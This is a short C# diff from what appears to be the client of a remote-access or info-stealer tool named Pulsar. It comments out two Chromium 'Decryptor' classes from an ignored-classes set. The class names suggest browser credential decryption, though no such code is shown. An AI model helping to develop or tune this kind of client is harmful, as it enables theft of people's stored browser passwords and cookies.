@@ -31,8 +31,8 @@ namespace Pulsar.Client.User
 
             _ignoredClasses = new HashSet<Type>
                 {
-                    typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumDecryptor),
-                    typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumV127Decryptor)
+                    //typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumDecryptor),
+                    //typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumV127Decryptor)
                 };
 
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
